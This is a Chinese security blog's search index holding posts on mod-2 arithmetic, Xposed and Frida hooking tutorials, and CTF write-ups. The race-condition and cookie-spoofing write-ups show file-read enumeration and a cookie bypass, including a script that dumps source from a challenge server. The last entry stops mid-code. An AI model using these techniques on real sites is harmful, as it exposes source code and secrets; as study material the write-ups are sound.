<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>模2运算</title>
      <link href="/%E6%A8%A12%E8%BF%90%E7%AE%97.html"/>
      <url>/%E6%A8%A12%E8%BF%90%E7%AE%97.html</url>
      
        <content type="html"><![CDATA[<h2 id="模2运算"><a href="#模2运算" class="headerlink" title="模2运算"></a>模2运算</h2><blockquote><p>简介：将数字换算成二进制的形式进行运算，无进位也无借位。</p></blockquote><h2 id="模2加法"><a href="#模2加法" class="headerlink" title="模2加法"></a>模2加法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> + <span class="number">0</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> + <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> + <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">1010101</span></span><br><span class="line">+   <span class="number">1000101</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">0010000</span></span><br><span class="line"> </span><br><span class="line">    <span class="number">10101011</span></span><br><span class="line">+   <span class="number">10100111</span></span><br><span class="line">+   <span class="number">11100010</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">11101110</span></span><br><span class="line"></span><br><span class="line">奇数个<span class="number">1</span>相加得<span class="number">1</span>，偶数个<span class="number">1</span>相加得<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="模2减法"><a href="#模2减法" class="headerlink" title="模2减法"></a>模2减法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> - <span class="number">0</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> - <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> - <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">1010101</span></span><br><span class="line">-   <span class="number">1000101</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">0010000</span></span><br><span class="line">    </span><br><span class="line">    <span class="number">10101011</span></span><br><span class="line">-   <span class="number">10100111</span></span><br><span class="line">-   <span class="number">11100010</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">11101110</span></span><br></pre></td></tr></table></figure><h2 id="模2乘法"><a href="#模2乘法" class="headerlink" title="模2乘法"></a>模2乘法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> x <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">1</span> x <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"><span class="number">0</span> x <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">0</span> x <span class="number">0</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">1010101</span></span><br><span class="line">x   <span class="number">1000101</span></span><br><span class="line">————————————</span><br><span class="line">    <span class="number">1000101</span></span><br></pre></td></tr></table></figure><h2 id="模2除法"><a href="#模2除法" class="headerlink" title="模2除法"></a>模2除法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">运算的时候每位都进行xor运算</span><br><span class="line">规则：被除数除以除数,被除数首位为<span class="number">1</span>时,商<span class="number">1</span>,为<span class="number">0</span>时商<span class="number">0</span></span><br><span class="line">     所得余数去除首位(左移一位)</span><br><span class="line">     重复上一步直到被除数位数少于除数位数</span><br><span class="line">例子：<span class="number">1111000</span>对除数<span class="number">1101</span>做模<span class="number">2</span>除法:</span><br><span class="line">         <span class="number">1011</span>             商</span><br><span class="line">     ------------</span><br><span class="line"><span class="number">1101</span>/ <span class="number">1111000</span>             被除数 首位为<span class="number">1</span>，商为<span class="number">1</span></span><br><span class="line">      <span class="number">1101</span>                除数</span><br><span class="line">     ------------</span><br><span class="line">     <span class="number">0010000</span>             余数去除首位,作为新的被除数，首位为<span class="number">0</span>，商为<span class="number">0</span></span><br><span class="line">      <span class="number">0000</span>               被除数首位为<span class="number">0</span>，则除数就为<span class="number">0</span></span><br><span class="line">     ------------</span><br><span class="line">      <span class="number">010000</span>             余数去除首位,作为新的被除数，首位为<span class="number">1</span>，商为<span class="number">1</span></span><br><span class="line">       <span class="number">1101</span>              被除数首位为<span class="number">1</span>,除以除数 </span><br><span class="line">     ------------</span><br><span class="line">       <span class="number">01010</span>             余数去除首位,作为新的被除数，首位为<span class="number">1</span>，商为<span class="number">1</span></span><br><span class="line">        <span class="number">1101</span>             被除数首位为<span class="number">1</span>,除以除数  </span><br><span class="line">     ------------</span><br><span class="line">        <span class="number">0111</span>             余数去除首位，为<span class="number">111</span>位数为<span class="number">3</span>，小于除数位数<span class="number">4</span>，不再进行运算，得到结果</span><br><span class="line">结果：商<span class="number">1011</span>余<span class="number">111</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xposed hook框架学习</title>
      <link href="/Xposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html"/>
      <url>/Xposed-hook%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<h3 id="Xposed-安装"><a href="#Xposed-安装" class="headerlink" title="Xposed 安装"></a>Xposed 安装</h3><p><a href="http://dl-xda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk" target="_blank" rel="noopener">xposed.apk</a></p><p><img src="/images/pasted-127.png" alt="upload successful"></p><h4 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h4><p><img src="/images/pasted-128.png" alt="upload successful"></p><blockquote><p>初次运行是点击 安装/更新 就行了，后续在激活模块的时候可以点击 软重启 重启手机(模拟器)</p></blockquote><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><img src="/images/pasted-129.png" alt="upload successful"></p><blockquote><p>显示已安装的模块，打勾的说明是已经激活的</p></blockquote><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><img src="/images/pasted-130.png" alt="upload successful"></p><blockquote><p>显示网上已经有的模块，别人开发好的，可以直接拿过来用的那种</p></blockquote><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p><img src="/images/pasted-131.png" alt="upload successful"></p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p><img src="/images/pasted-132.png" alt="upload successful"></p><blockquote><p>显示模块运行时后的日志信息，可用来显示XposedBridge.log(“”);打印出来的消息</p></blockquote><h4 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h4><p><img src="/images/pasted-133.png" alt="upload successful"></p><h3 id="第一个模块学习"><a href="#第一个模块学习" class="headerlink" title="第一个模块学习"></a>第一个模块学习</h3><h4 id="在build-gradle中添加信息"><a href="#在build-gradle中添加信息" class="headerlink" title="在build.gradle中添加信息"></a>在build.gradle中添加信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compileOnly <span class="string">'de.robv.android.xposed:api:82'</span></span><br><span class="line">compileOnly <span class="string">'de.robv.android.xposed:api:82:sources'</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-134.png" alt="upload successful"></p><blockquote><p>导入框架需要的依赖</p></blockquote><h4 id="AndroidManifest-xml添加如下信息"><a href="#AndroidManifest-xml添加如下信息" class="headerlink" title="AndroidManifest.xml添加如下信息"></a>AndroidManifest.xml添加如下信息</h4><p><img src="/images/pasted-135.png" alt="upload successful"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span>        该程序是否是<span class="attr">xposed</span>的模块</span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span>   对本模块的功能的描述，可以自己简单的描述一下可以了</span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"Module测试"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span>    是本模块开发时用到的<span class="attr">Xposed</span>的<span class="attr">jar</span>包最低版本号</span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意该段代码的放置位置</p></blockquote><h4 id="添加模块的入口函数"><a href="#添加模块的入口函数" class="headerlink" title="添加模块的入口函数"></a>添加模块的入口函数</h4><p><img src="/images/pasted-136.png" alt="upload successful"></p><p><img src="/images/pasted-137.png" alt="upload successful"></p><blockquote><p>新建一个类，为Xposed模块的主类，新建一个assets目录，在目录下创建一个file xposed_init，里面添上模块入口函数的路径</p></blockquote><h4 id="编写模块的主要代码"><a href="#编写模块的主要代码" class="headerlink" title="编写模块的主要代码"></a>编写模块的主要代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lpparam.packageName.equals(<span class="string">"com.example.helloworld"</span>))&#123;</span><br><span class="line"></span><br><span class="line">            XposedHelpers.findAndHookMethod(TextView.class, <span class="string">"setText"</span>,CharSequence.class, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.args[<span class="number">0</span>] = <span class="string">"isHookedbe"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.args[<span class="number">0</span>] = <span class="string">"isHookedaf"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>作用是HOOK TextView的setText方法</p></blockquote><h4 id="被Hook的程序的MainActivity"><a href="#被Hook的程序的MainActivity" class="headerlink" title="被Hook的程序的MainActivity"></a>被Hook的程序的MainActivity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.helloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Button b;</span><br><span class="line">    <span class="keyword">private</span> TextView t;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        b = (Button)findViewById(R.id.button);</span><br><span class="line">        t = (TextView)findViewById(R.id.textView);</span><br><span class="line"></span><br><span class="line">        b.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                t.setText(<span class="string">"aaaaaaaaaaaaaaa"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在点击程序后本应该会显示aaaaaaaaaaaaaaa，hook之后会显示isHookedbe</p></blockquote><h4 id="看图"><a href="#看图" class="headerlink" title="看图"></a>看图</h4><p><img src="/images/pasted-138.png" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>先Hook成功一个案例，然后实现各种操作吧，可以看看官方的api</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xposed框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida Hook神器学习-1</title>
      <link href="/frida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html"/>
      <url>/frida-Hook%E7%A5%9E%E5%99%A8%E5%AD%A6%E4%B9%A0-1.html</url>
      
        <content type="html"><![CDATA[<h3 id="Android三大框架对比"><a href="#Android三大框架对比" class="headerlink" title="Android三大框架对比"></a>Android三大框架对比</h3><h4 id="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："><a href="#Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：" class="headerlink" title="Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点："></a>Frida，Xposed，SubstrateCydia这三个Hook神器的区别和优缺点：</h4><h6 id="Xposed的优缺点"><a href="#Xposed的优缺点" class="headerlink" title="Xposed的优缺点"></a>Xposed的优缺点</h6><blockquote><p>优点：在编写Java层hook插件的时候非常好用，这一点完全优越于Frida和SubstrateCydia，因为他也是Android项目，可以直接编写Java代码调用各类api进行操作。而且可以安装到手机上直接使用。</p></blockquote><blockquote><p>缺点：配置安装环境繁琐，兼容性差，在Hook底层的时候就很无助了。</p></blockquote><h5 id="Frida的优缺点"><a href="#Frida的优缺点" class="headerlink" title="Frida的优缺点"></a>Frida的优缺点</h5><blockquote><p>优点：在上面我们可以看到他的优点在于配置环境很简单，操作也很便捷，对于破解者开发阶段非常好用。支持Java层和Native层hook操作，在Native层hook如果是非基本类型的话操作有点麻烦。</p></blockquote><blockquote><p>缺点：因为他只适用于破解者在开发阶段，也就是他没法像Xposed用于实践生产中，比如我写一个微信外挂用Frida写肯定不行的，因为他无法在手机端运行。也就是破解者用的比较多。</p></blockquote><h5 id="SubstrateCydia的优缺点"><a href="#SubstrateCydia的优缺点" class="headerlink" title="SubstrateCydia的优缺点"></a>SubstrateCydia的优缺点</h5><blockquote><p>优点：可以运行在手机端，和Xposed类似可以用于实践生产中。支持Java层和Native层的hook操作，但是Java层hook不怎么常用，用的比较多的是Native层hook操作，因为他也是Android工程可以引用系统api，操作更为方便</p></blockquote><blockquote><p>缺点：和Xposed一样安装配置环境繁琐，兼容性差。</p></blockquote><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>以上这三个工具可以说是现在用的最多的hook工具了，总结一句话就是写Java层Hook还是Xposed方便，写Native层Hook还是Cydia了，而对于破解者开发那还是Frida最靠谱了。写外挂最难的也是最重要的不是<br>写代码而是寻找hook点，也就是逆向分析app找到那个地方，然后写hook代码实现插件功能。</p></blockquote><h3 id="frida-install"><a href="#frida-install" class="headerlink" title="frida install"></a>frida install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br><span class="line">下载frida-server</span><br><span class="line">https://github.com/frida/frida/releases</span><br></pre></td></tr></table></figure><h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><blockquote><p>在terminal中运行cat命令</p></blockquote><p><img src="/images/pasted-126.png" alt="upload successful"></p><blockquote><p>新开terminal，运行以下代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    print(<span class="string">"[on_message] message:"</span>, message, <span class="string">"data:"</span>, data)</span><br><span class="line"></span><br><span class="line">session = frida.attach(<span class="string">"cat"</span>)</span><br><span class="line"></span><br><span class="line">script = session.create_script(<span class="string">"""</span></span><br><span class="line"><span class="string">rpc.exports.enumerateModules = function () &#123;</span></span><br><span class="line"><span class="string">  return Process.enumerateModules();</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line">script.on(<span class="string">"message"</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">print([m[<span class="string">"name"</span>] <span class="keyword">for</span> m <span class="keyword">in</span> script.exports.enumerate_modules()])</span><br></pre></td></tr></table></figure><blockquote><p>输出类似如下信息,即说明安装成功</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[u<span class="string">'cat'</span>, u<span class="string">'libSystem.B.dylib'</span>, u<span class="string">'libcache.dylib'</span>, u<span class="string">'libcommonCrypto.dylib'</span>, u<span class="string">'libcompiler_rt.dylib'</span>, u<span class="string">'libcopyfile.dylib'</span>, u<span class="string">'libcorecrypto.dylib'</span>, u<span class="string">'libdispatch.dylib'</span>, u<span class="string">'libdyld.dylib'</span>, u<span class="string">'libkeymgr.dylib'</span>, u<span class="string">'liblaunch.dylib'</span>, u<span class="string">'libmacho.dylib'</span>, u<span class="string">'libquarantine.dylib'</span>, u<span class="string">'libremovefile.dylib'</span>, u<span class="string">'libsystem_asl.dylib'</span>, u<span class="string">'libsystem_blocks.dylib'</span>, u<span class="string">'libsystem_c.dylib'</span>, u<span class="string">'libsystem_configuration.dylib'</span>, u<span class="string">'libsystem_coreservices.dylib'</span>, u<span class="string">'libsystem_darwin.dylib'</span>, u<span class="string">'libsystem_dnssd.dylib'</span>, u<span class="string">'libsystem_info.dylib'</span>, u<span class="string">'libsystem_m.dylib'</span>, u<span class="string">'libsystem_malloc.dylib'</span>, u<span class="string">'libsystem_networkextension.dylib'</span>, u<span class="string">'libsystem_notify.dylib'</span>, u<span class="string">'libsystem_sandbox.dylib'</span>, u<span class="string">'libsystem_secinit.dylib'</span>, u<span class="string">'libsystem_kernel.dylib'</span>, u<span class="string">'libsystem_platform.dylib'</span>, u<span class="string">'libsystem_pthread.dylib'</span>, u<span class="string">'libsystem_symptoms.dylib'</span>, u<span class="string">'libsystem_trace.dylib'</span>, u<span class="string">'libunwind.dylib'</span>, u<span class="string">'libxpc.dylib'</span>, u<span class="string">'libobjc.A.dylib'</span>, u<span class="string">'libc++abi.dylib'</span>, u<span class="string">'libc++.1.dylib'</span>, u<span class="string">'dyld'</span>]</span><br></pre></td></tr></table></figure><h3 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h3><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/80372118</a></p><p><a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">https://www.frida.re/docs/home/</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> android hook </tag>
            
            <tag> android frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的条件竞争的题目</title>
      <link href="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html"/>
      <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手</p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/images/pasted-116.png" alt="upload successful"></p><blockquote><p>我们可以控制文件的名字和文件的内容</p></blockquote><p><img src="/images/pasted-117.png" alt="upload successful"></p><p><img src="/images/pasted-118.png" alt="upload successful"></p><blockquote><p>但是当我们访问的时候去发现访问不到，猜想应该是被删了，这就要利用条件竞争这个漏洞了</p></blockquote><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>创建一个多线程程序不断的向服务器发起请求创建一个文件，在创建一个程序循环读取这个文件</p></blockquote><blockquote><p>这里使用burp suite进行申请创建文件，写一个死循环读取这个文件</p></blockquote><p><img src="/images/pasted-119.png" alt="upload successful"></p><p><img src="/images/pasted-120.png" alt="upload successful"></p><blockquote><p>在start attack之前需要先运行访问的脚本</p></blockquote><p><img src="/images/pasted-124.png" alt="upload successful"></p><p><img src="/images/pasted-122.png" alt="upload successful"></p><p><img src="/images/pasted-123.png" alt="upload successful"></p><p><img src="/images/pasted-125.png" alt="upload successful"></p><blockquote><p>可以得到内容，这题旨在能够访问到这个文件就能拿到flag</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0RTAwJXU0RTBCJXU1NDYy</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie欺骗 writeup</title>
      <link href="/cookie%E6%AC%BA%E9%AA%97-writeup.html"/>
      <url>/cookie%E6%AC%BA%E9%AA%97-writeup.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Begin</p></blockquote><p><img src="/images/pasted-113.png" alt="upload successful"></p><blockquote><p>发现filename为keys.txt的base64加密，试着读取index.php文件</p></blockquote><p><img src="/images/pasted-114.png" alt="upload successful"></p><blockquote><p>发现能读到东西了，接下来读取整个文件</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"</span>%i</span><br><span class="line">    respone = get(url=url)</span><br><span class="line">    <span class="keyword">print</span> respone.text</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line">    <span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">    $file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span 